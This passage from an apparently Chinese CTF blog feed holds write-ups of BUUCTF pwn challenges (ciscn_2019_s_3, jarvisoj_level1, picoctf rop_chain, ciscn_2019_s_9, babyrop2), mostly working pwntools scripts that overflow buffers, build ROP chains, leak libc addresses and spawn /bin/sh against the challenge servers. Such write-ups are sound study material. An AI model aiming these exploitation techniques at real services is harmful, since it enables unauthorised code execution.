rsi=r14 ; edi=r15   call r12 ; rbx+=1 ; cmp rbx ,rbp; jne back ; csuSetStack……ret</span><br>binshStackAddr=reals-<span class="hljs-number">0x148</span><br>padding=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">56</span><br>payload2=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(mov_rax_ret)<br>payload2+=p64(csuSetStack)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(binshStackAddr+<span class="hljs-number">0x8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>payload2+=p64(csuSetRegister)+padding<br>payload2+=p64(pop_rdi_ret)+p64(binshStackAddr)+p64(syscallAddr)+p64(backAddr)<br></code></pre></td></tr></table></figure><p>其中，reals为泄露的栈地址，这里我采用让call [r12]跳转到mov rax,59的指令处，并把该指令布置在&#x2F;bin&#x2F;sh字符串的上方<br><br>最后一步，确定buffer首地址距离vuln函数返回地址的偏移量<br><br>为什么这一步放到最后记录，因为这道题目有一个巨大的坑，如果只通过IDA来确定偏移量，如第一张图所示，offset应该&#x3D;0x10+0x8&#x3D;0x18<br><br>但是这是错的，这道题不能依赖IDA来确定offset，因为当仔细观察vuln函数的反汇编时会发现，结尾并没有熟悉的leave操作，而是直接ret，并不符合一般函数的退栈流程，因此不能假定返回地址在rbp的高一格位置<br><br>至于为什么会出现这种情况？个人怀疑这里是出题者故意设计的，因为我们需要一个syscall ; ret的碎片，所以出题者故意没有加leave指令<br><br>因此需要使用cyclic工具来计算偏移量，最后算出来offset&#x3D;0x10，如下图所示：<br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn_2019_s_3/cyclic.png"><br>综上，可以写出如下的利用脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>LOCAL=<span class="hljs-number">0</span><br>REMOTE=<span class="hljs-number">1</span><br>DEBUG=<span class="hljs-number">2</span><br><br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF)<br>offset=<span class="hljs-number">16</span><br><br>backAddr=elf.symbols[<span class="hljs-string">&quot;vuln&quot;</span>]<br><br>retAlignPadding=<span class="hljs-number">0x4003a9</span>   <span class="hljs-comment"># ret</span><br>mov_rax_ret=<span class="hljs-number">0x4004e2</span>       <span class="hljs-comment"># mov rax,59 ; ret</span><br>pop_rdi_ret=<span class="hljs-number">0x4005a3</span>       <span class="hljs-comment"># pop rdi ; ret</span><br>syscallAddr=<span class="hljs-number">0x400517</span>       <span class="hljs-comment"># syscall</span><br>csuSetStack=<span class="hljs-number">0x40059a</span>       <span class="hljs-comment"># push rbx ; push rbp; push r12 ; push r13 ; push r14 ; push r15 ; ret</span><br>csuSetRegister=<span class="hljs-number">0x400580</span>    <span class="hljs-comment">#                                 rdx=r13;  rsi=r14 ; edi=r15   call r12 ; rbx+=1 ; cmp rbx ,rbp; jne back ; csuSetStack……ret</span><br><br>binshBytes=<span class="hljs-number">0x2f62696e2f736800</span> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        ioTube=process(targetELF)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode ==REMOTE:<br>        ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25733</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        ioTube=gdb.debug(targetELF,<span class="hljs-string">&quot;b *0x400519&quot;</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">LeakAddr</span>(<span class="hljs-params">io</span>):<br>    payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p64(backAddr)<br>    io.send(payload1)<br>    io.recv(<span class="hljs-number">0x20</span>)<br>    response=io.recv(<span class="hljs-number">0x10</span>)<br>    realAddr=u64(response[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">return</span> realAddr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Attack</span>(<span class="hljs-params">io,reals</span>):<br>    binshStackAddr=reals-<span class="hljs-number">0x148</span><br>    padding=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">56</span><br>    payload2=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(mov_rax_ret)<br>    payload2+=p64(csuSetStack)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(binshStackAddr+<span class="hljs-number">0x8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>    payload2+=p64(csuSetRegister)+padding<br>    payload2+=p64(pop_rdi_ret)+p64(binshStackAddr)+p64(syscallAddr)+p64(backAddr)<br>    io.send(payload2)                                      <br>    io.recv()<br>    io.interactive()<br><br>ioTube=Lauch()<br>realAddr=LeakAddr(ioTube)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;addr.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(<span class="hljs-built_in">hex</span>(realAddr))<br>Attack(ioTube,realAddr)<br></code></pre></td></tr></table></figure><p>但是至此还没结束，这也是这道题的最后一个坑<br><br>由于上述分析是在ubuntu22上进行的，因此当我在本地打通之后，无法打通远程<br><br>后来观察题目，发现服务器环境是ubuntu18，因此换了台ubuntu18的虚拟机，重新分析了一遍，发现是泄露地址距离buf的偏移发生了变化（上文算的0x148不对），如下图所示：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn_2019_s_3/Ubuntu18-offset.png"><br>可以看到二者距离应该是0x7ffc426e0da8-0x7ffc426e0c90&#x3D;0x118<br>其他地址并没有错误，因此将上述脚本中的binshStackAddr改为reals-0x118即可<br></p>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>ROP</category>
      
      <category>ret2csu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-jarvisoj_level1</title>
    <link href="/2025/08/01/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-jarvisoj-level1/"/>
    <url>/2025/08/01/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-jarvisoj-level1/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF第2页的题，原题链接：<a href="https://buuoj.cn/challenges#jarvisoj_level1">BUUCTF原题：jarvisoj_level1</a></p><span id="more"></span><p>这道题思路不难，但非常有误导性，乍一看是ret2shellcode的题，但是本地和远程的输入输出交互完全不同，导致能在本地打通的方法在远程无效</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec看到保护全关：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-jarvisoj_level1/checksec.png"><br>之后查看IDA的反编译结果，找到在vulnerable_function的read操作时会发生溢出：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-jarvisoj_level1/IDA-vulnerable_function.png"><br>同时注意到在函数的开头会泄露buf变量的地址，因此漏洞点为借助buf基址计算返回地址，最后劫持到shellcode<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>根据IDA反编译结果可以得知Offset&#x3D;0x88+0x4<br><br>因此写出如下的ret2shellcode脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF)<br>ioTube=process(targetELF)<br><span class="hljs-comment"># ioTube=gdb.debug(targetELF,&quot;b *vulnerable_function+59&quot;)</span><br><span class="hljs-comment"># ioTube=remote(&quot;node5.buuoj.cn&quot;,28073)</span><br>offset=<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span><br>shellcode=asm(shellcraft.sh())<br><br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;What&#x27;s this:0x&quot;</span>)<br>bufStart=<span class="hljs-built_in">int</span>(ioTube.recvuntil(<span class="hljs-string">&#x27;?&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)<br>returnAddr=bufStart<br>payload=shellcode+<span class="hljs-string">b&#x27;1&#x27;</span>*(offset-<span class="hljs-built_in">len</span>(shellcode))+p32(returnAddr)<br><br>ioTube.recvline()<br>ioTube.send(payload)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>但是，这道题特别坑，上述脚本可以在本地打通但无法打通远程，通过nc命令，和本地运行程序对比，可以看到输入输出行为完全不一致：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-jarvisoj_level1/interactive-diff.png"><br>可以看到远程输出时不会在一开始泄露buf地址，因此无法使用ret2shellcode的方式；<br><br>遇到这种情况，可以考虑ret2libc的方法<br><br>ret2libc关键是泄露地址，观察IDA反汇编的函数表，看到原程序存在write系统调用，因此采用write函数泄露__libc_start_main的地址<br><br>（注意：不能采用printf函数泄露地址，因为不好构造含有%s的格式化字符串；程序自身带的%p不能使用，因为%p只能打印出got表的地址，而不是其指向的__libc_start_main地址）<br><br>综上，写出最终的利用脚本如下所示：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>localLibc=ELF(<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<br>elf=ELF(targetELF)<br><br>offset=<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span><br>pltAddr=elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;__libc_start_main&quot;</span><br>gotAddr=elf.got[leakFuncName]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;vulnerable_function&quot;</span>]<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(pltAddr)+p32(startAddr)+p32(<span class="hljs-number">1</span>)+p32(gotAddr)+p32(<span class="hljs-number">4</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RemoteAttack</span>():<br>    ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28073</span>)<br>    ioTube.sendline(payload1)<br>    response=ioTube.recv(<span class="hljs-number">4</span>)<br><br>    realAddr=u32(response)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;泄露真实地址=&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(realAddr)))<br><br>    remoteLibc=LibcSearcher(leakFuncName,realAddr)<br>    libcBase=realAddr-remoteLibc.dump(leakFuncName)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;泄露得到真实地址=&#123;&#125;，libc基址=&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(realAddr),<span class="hljs-built_in">hex</span>(libcBase)))<br>    sysAddr=libcBase+remoteLibc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>    binshAddr=libcBase+remoteLibc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>    payload2=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p32(sysAddr)+p32(<span class="hljs-number">0</span>)+p32(binshAddr)<br>    <span class="hljs-comment"># ioTube.recv()</span><br>    ioTube.sendline(payload2)<br>    ioTube.interactive()<br><br>RemoteAttack()<br></code></pre></td></tr></table></figure><p>最后一点值得注意的是，实际打远程时LibcSearcher会搜索到多个版本的libc<br><br>目前没有什么好的办法直接得知选哪个，本人是一个一个尝试，最后发现1号libc是和服务器对应的版本,如图所示：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-jarvisoj_level1/choose-libc.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>ROP</category>
      
      <category>ret2libc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>部分题目的通解：ret2libc</title>
    <link href="/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E7%9A%84%E9%80%9A%E8%A7%A3%EF%BC%9Aret2libc/"/>
    <url>/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E7%9A%84%E9%80%9A%E8%A7%A3%EF%BC%9Aret2libc/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在面对部分题目时，ret2libc可以作为通用解法，这类题目多为一些简单的后门函数、shellcode。<br></p><span id="more"></span><p>这些题目大多具有共同的特点：<br><br>1 思路简单，代码量很少，容易发现溢出点，容易分析<br><br>2 但真正想要实现ret2shellcode或者后门函数，需要一些技巧（比如泄露栈地址等），难以第一时间想到<br><br>3 必须是动态链接文件（通过file查看）<br><br>4 最好是没有开启PIE和canary的程序<br><br>此时，在发现溢出点后，即可直接考虑ret2libc拿到shell，不用再继续进行复杂的分析和技巧考虑<br></p><h1 id="例1：BUUCTF-picoctf-2018-rop-chain"><a href="#例1：BUUCTF-picoctf-2018-rop-chain" class="headerlink" title="例1：BUUCTF-picoctf_2018_rop_chain"></a>例1：BUUCTF-picoctf_2018_rop_chain</h1><p>具体分析见：<a href="https://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-picoctf-2018-rop-chain/">BUUCTF题解：picoctf_2018_rop_chain</a><br>现在提供一个ret2libc的解法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF)<br><span class="hljs-comment"># ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x4006a4&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27661</span>)<br><br>offset=<span class="hljs-number">28</span><br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;__libc_start_main&quot;</span><br>gotAddr=elf.got[leakFuncName]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;Enter your input&gt; &quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(pltAddr)+p32(startAddr)+p32(gotAddr)<br>ioTube.sendline(payload1)<br>realAddr=u32(ioTube.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;泄露真实地址=&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(realAddr)))<br>libc=LibcSearcher(leakFuncName,realAddr)<br>libcBase=realAddr-libc.dump(leakFuncName)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;泄露得到真实地址=&#123;&#125;，libc基址=&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(realAddr),<span class="hljs-built_in">hex</span>(libcBase)))<br>sysAddr=libcBase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binshAddr=libcBase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload2=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p32(sysAddr)+p32(<span class="hljs-number">0</span>)+p32(binshAddr)<br>ioTube.recvuntil(<span class="hljs-string">&quot;input&gt; &quot;</span>)<br>ioTube.sendline(payload2)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><h1 id="例2：BUUCTF-ciscn-2019-s-9"><a href="#例2：BUUCTF-ciscn-2019-s-9" class="headerlink" title="例2：BUUCTF-ciscn_2019_s_9"></a>例2：BUUCTF-ciscn_2019_s_9</h1><p>具体分析见：<a href="https://0x4a-210.github.io/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Shellcode/BUUCTF-ciscn-2019-s-9/">BUUCTF题解：ciscn_2019_s_9</a><br>这道题同样存在ret2libc的解法如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>libcPath=<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span><br>elf=ELF(targetELF)<br><span class="hljs-comment">#ioTube=process(targetELF)</span><br><span class="hljs-comment">#ioTube=gdb.debug(targetELF,&quot;b *0x4006a4&quot;)</span><br>ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29656</span>)<br><br>offset=<span class="hljs-number">0x24</span><br>retAlignPadding=<span class="hljs-number">0x8048342</span><br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;puts&quot;</span><br>gotAddr=elf.got[leakFuncName]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><br>ioTube.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(pltAddr)+p32(startAddr)+p32(gotAddr)<br>ioTube.sendline(payload1)<br>ioTube.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)<br>realAddr=u32(ioTube.recv(<span class="hljs-number">4</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(leakFuncName,realAddr)<br>libcBase=realAddr-libc.dump(leakFuncName)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;泄露得到真实地址=&#123;&#125;，libc基址=&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(realAddr),<span class="hljs-built_in">hex</span>(libcBase)))<br>sysAddr=libcBase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binshAddr=libcBase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>payload2=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p32(sysAddr)+p32(<span class="hljs-number">0</span>)+p32(binshAddr)<br>ioTube.recvuntil(<span class="hljs-string">&quot;&gt;\n&quot;</span>)<br>ioTube.sendline(payload2)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>其他技巧类</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-HarekazeCTF2019-babyrop2</title>
    <link href="/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/"/>
    <url>/2025/07/27/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF原题，链接在这：<a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2">BUUCTF原题：[HarekazeCTF2019]baby_rop2</a></p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是拖进IDA里分析：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/IDA-main.png"><br>可以看到溢出点发生在main函数，并且从左侧的函数表来看没有明显的后门函数<br><br>接下来用checksec查看一下保护：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/checksec.png"><br>可以看到只开启了NX保护，再联系到题目给了libc.so.6的附件，可以分析出这道题需要ret2libc<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先通过IDA看出偏移量offset&#x3D;0x20+0x8&#x3D;0x28<br><br>接下来考虑如何泄露libc基地址<br><br>注意观察程序中没有调用puts函数，但有一个printf函数，所以只能通过printf来输出libc的基地址<br><br>接下来希望能找到程序本身存在的格式化字符串，在IDA中使用shift+F12，可以看到在程序的只读数据段（.rodata）存在%s格式字符串，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/format-string.png"><br>然后鼠标双击这个字符串，可以找到格式化字符串的实际地址，如图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/rodata.png"><br>printf函数有两个参数，因此要寻找pop rdi、pop rsi和ret指令碎片：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2libc/BUUCTF-HarekazeCTF2019-babyrop2/gadgets.png"><br>如上图所示，最终找到可用的pop rdi、pop rsi和ret指令的碎片分别在0x400733、0x400731和0x4004d1的位置<br><br>注意，这个程序里面没有完美的pop rsi ; ret序列，只能用0x400731处的pop rsi ; pop r15 ; ret序列凑活一下，到时候多填充个数给r15即可<br><br>最后，用于泄露地址的目标函数还是选择__libc_start_main<br><br>综上，最终的利用脚本如下：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span 